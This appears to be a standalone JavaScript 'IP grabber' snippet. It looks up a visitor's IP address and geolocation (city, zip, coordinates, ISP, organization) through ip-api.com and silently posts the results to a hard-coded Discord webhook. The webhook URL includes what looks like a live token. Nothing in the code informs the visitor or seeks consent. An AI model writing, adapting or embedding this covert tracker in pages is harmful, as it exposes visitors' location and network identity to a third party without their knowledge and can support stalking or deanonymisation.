$.getJSON('http://ip-api.com/json', function(data) {
    const post = {
        "content": null,
        "embeds": [
          {
            "title": "`" + data.query + "`",
            "color": null,
            "fields": [
              {
                "name": "Status",
                "value": data.status + " "
              },
              {
                "name": "Country (" + data.countryCode + ")",
                "value": data.country + " "
              },
              {
                "name": "Region (" + data.region + ")",
                "value": data.regionName + " "
              },
              {
                "name": "City",
                "value":  data.city + " (" + data.zip + ")"
              },
              {
                "name": "Coordinates",
                "value": "Latitude: `" + data.lat + "`\nLongtitude: `" + data.lon + "`"
              },
              {
                "name": "Timezone",
                "value": data.timezone + " "
              },
              {
                "name": "Internet Service Provider",
                "value": data.isp + " "
              },
              {
                "name": "Organization",
                "value": data.org + " "
              },
              {
                "name": "Autonomous System",
                "value": data.as + " "
              }
            ]
          }
        ],
        "attachments": []
      }
      var request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/1088442474265067520/Vy_VjIlrH6-BciXx4vOwl4bZvtV8H5ewdypAZfUIX6SEYDfd40108FXcYUwy9g_A7Hup");

      request.setRequestHeader('Content-type', 'application/json');

      request.send(JSON.stringify(post));
});